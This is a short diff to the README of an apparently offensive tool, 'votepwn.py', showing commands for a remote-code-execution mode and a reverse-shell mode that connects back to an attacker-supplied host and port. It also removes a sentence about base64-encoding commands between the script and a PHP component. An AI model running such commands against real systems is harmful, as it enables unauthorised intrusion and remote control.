@@ -3,7 +3,6 @@
 ```bash
 python3 votepwn.py -rce -u <username> -p <password> 
 ```
-User can use any kind of command since it will be b64 encoded by the python script and decoded by the php script, as I'm writing this sentence I'm realising that it might've been better to url encode so user can curl or whatever, I'll check it out.
 - Reverse shell
 ```bash
 python3 votepwn.py -rs -u <username> -p <password> -lh <lhost> -lp <lport>
